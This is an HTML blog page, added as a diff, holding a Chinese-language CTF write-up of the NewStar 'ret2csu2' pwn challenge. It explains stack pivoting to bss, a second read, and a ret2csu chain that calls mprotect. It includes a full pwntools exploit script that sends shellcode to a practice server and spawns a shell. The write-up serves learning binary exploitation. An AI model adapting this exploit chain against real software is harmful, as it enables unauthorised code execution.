@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="New-star-Week4-Ret2csu2  拿到题目，我们先checksec一下：  那就可能是栈溢出了，我们看了看源码：  这个题目，我是不会的，也是去学习了别的师傅的wp，才会的，前两个函数没啥说的，普通的向屏幕输出语句，第三个函数是存在溢出的，但是溢出的字节数是不够的，那就要考虑栈迁移了，栈迁移首先是考虑迁移到bss段的，但是栈迁移也存在问题，我们只能读入一次，读入的字节太有限了，所以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="week4-ret2csu2">
+<meta property="og:url" content="http://example.com/2024/06/05/week4-ret2csu2/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="New-star-Week4-Ret2csu2  拿到题目，我们先checksec一下：  那就可能是栈溢出了，我们看了看源码：  这个题目，我是不会的，也是去学习了别的师傅的wp，才会的，前两个函数没啥说的，普通的向屏幕输出语句，第三个函数是存在溢出的，但是溢出的字节数是不够的，那就要考虑栈迁移了，栈迁移首先是考虑迁移到bss段的，但是栈迁移也存在问题，我们只能读入一次，读入的字节太有限了，所以">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/06/05/week4-ret2csu2/1.png">
+<meta property="og:image" content="http://example.com/2024/06/05/week4-ret2csu2/2.png">
+<meta property="og:image" content="http://example.com/2024/06/05/week4-ret2csu2/3.png">
+<meta property="og:image" content="http://example.com/2024/06/05/week4-ret2csu2/5.png">
+<meta property="og:image" content="http://example.com/2024/06/05/week4-ret2csu2/6.png">
+<meta property="article:published_time" content="2024-06-05T07:17:36.000Z">
+<meta property="article:modified_time" content="2024-06-05T10:34:40.685Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="栈溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/06/05/week4-ret2csu2/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>week4-ret2csu2</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2024/06/08/jarvisoj-test-your-memory/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2024/06/03/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-canary/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/05/week4-ret2csu2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/05/week4-ret2csu2/&text=week4-ret2csu2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/05/week4-ret2csu2/&title=week4-ret2csu2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/05/week4-ret2csu2/&is_video=false&description=week4-ret2csu2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=week4-ret2csu2&body=Check out this article: http://example.com/2024/06/05/week4-ret2csu2/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/05/week4-ret2csu2/&title=week4-ret2csu2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/05/week4-ret2csu2/&title=week4-ret2csu2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/05/week4-ret2csu2/&title=week4-ret2csu2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/05/week4-ret2csu2/&title=week4-ret2csu2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/05/week4-ret2csu2/&name=week4-ret2csu2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/05/week4-ret2csu2/&t=week4-ret2csu2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">New-star-Week4-Ret2csu2</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        week4-ret2csu2
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-06-05T07:17:36.000Z" itemprop="datePublished">2024-06-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center">New-star-Week4-Ret2csu2</h1>
+
+<p>拿到题目，我们先checksec一下：</p>
+<p><img src="/2024/06/05/week4-ret2csu2/1.png" alt="1"></p>
+<p>那就可能是栈溢出了，我们看了看源码：</p>
+<p><img src="/2024/06/05/week4-ret2csu2/2.png" alt="2"></p>
+<p>这个题目，我是不会的，也是去学习了别的师傅的wp，才会的，前两个函数没啥说的，普通的向屏幕输出语句，第三个函数是存在溢出的，但是溢出的字节数是不够的，那就要考虑栈迁移了，栈迁移首先是考虑迁移到bss段的，但是栈迁移也存在问题，我们只能读入一次，读入的字节太有限了，所以我们要想办法多读入一次，其实是很简单的，但是我愣是没想到，就是跳到lea rsi,[rbp-0xf0]这里，因为最后执行的是read函数，很多寄存器的值都没改变，我们可以下断点(main函数的快结尾)去看看：</p>
+<p><img src="/2024/06/05/week4-ret2csu2/3.png" alt="3"></p>
+<p>可以看到，rax还是等于0，那么系统调用就是read函数，rdi是0，第一个参数正确，rdx是0x100,第三个参数也是正确的，第二个参数也是可以控制的，我们第一次ret跳到这里就可以了：</p>
+<p><img src="/2024/06/05/week4-ret2csu2/5.png" alt="5"></p>
+<p>这样跳转过去，就可以再次执行read函数了，那么第二个参数地址写成0x601020 就可以了，这里IDA给反汇编好像不对，题目给了c程序，看题目即可，0x601020是bss段的起始地址，如何控制第二个参数？只需要溢出覆盖旧的rbp为0x601020 + 0xf0,这样第二个参数rsi就是0x601020了：</p>
+<p><img src="/2024/06/05/week4-ret2csu2/6.png" alt="6"></p>
+<p>接下来就是ret2csu了，payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26282</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss_start_address = 0x601020</span></span><br><span class="line"></span><br><span class="line">first_ebp = <span class="number">0x601020</span> + <span class="number">0xf0</span></span><br><span class="line">first_ret_address = <span class="number">0x4006E7</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0xf0</span>) + p64(first_ebp) + p64(first_ret_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时ebp指向0x601020+0xf0的地方</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Remember to check it!&quot;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">second_ret_address = <span class="number">0x40067B</span>     <span class="comment">#call _mprotect</span></span><br><span class="line">mprotect_got_address = <span class="number">0x600fe8</span></span><br><span class="line">leave_ret_address = <span class="number">0x400681</span></span><br><span class="line">gadget1 = <span class="number">0x40075A</span></span><br><span class="line">gadget2 = <span class="number">0x400740</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload_2 = p64(gadget1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(mprotect_got_address) + p64(<span class="number">0x601000</span>) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x7</span>) + p64(gadget2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x40大小</span></span><br><span class="line"><span class="comment"># asm(shellcraft.sh())为0x30</span></span><br><span class="line">shellcode = asm(shellcraft.sh()) </span><br><span class="line">payload_2 += <span class="string">b&quot;A&quot;</span>*(<span class="number">0x38</span>) + p64(<span class="number">0x601020</span>+<span class="number">0x40</span>+<span class="number">0x38</span>+<span class="number">0x8</span>) + shellcode + <span class="string">b&quot;A&quot;</span>*(<span class="number">0xf0</span>-<span class="number">0x40</span>-<span class="number">0x38</span>-<span class="number">0x8</span>-<span class="number">0x30</span>) + p64(<span class="number">0x601020</span>-<span class="number">0x8</span>) + p64(leave_ret_address)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload_2)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>read函数，二次读入后，rbp为0x601020 + 0xf0，返回到main函数结束位置，执行leave指令，rsp &#x3D;0x601020 + 0xf0，然后rbp &#x3D; 0x601020-0x8，然后retn到我们布置的leave ret这里，leave后，rsp &#x3D;0x601020,此时再次ret，就到了 p64(gadget1)的地方，执行retcsu，里面调用 mprotect函数改写权限，返回后顺势执行到最后一个retn指令，指向p64(0x601020+0x40+0x38+0x8)，去执行shellcode，b”A”*(0xf0-0x40-0x38-0x8-0x30)是为了填充数据大小到0xf0，填满read函数的区域。所以用send发送，sendline会多换行符，发送回失败。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">New-star-Week4-Ret2csu2</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/05/week4-ret2csu2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/05/week4-ret2csu2/&text=week4-ret2csu2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/05/week4-ret2csu2/&title=week4-ret2csu2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/05/week4-ret2csu2/&is_video=false&description=week4-ret2csu2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=week4-ret2csu2&body=Check out this article: http://example.com/2024/06/05/week4-ret2csu2/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/05/week4-ret2csu2/&title=week4-ret2csu2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/05/week4-ret2csu2/&title=week4-ret2csu2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/05/week4-ret2csu2/&title=week4-ret2csu2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/05/week4-ret2csu2/&title=week4-ret2csu2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/05/week4-ret2csu2/&name=week4-ret2csu2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/05/week4-ret2csu2/&t=week4-ret2csu2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
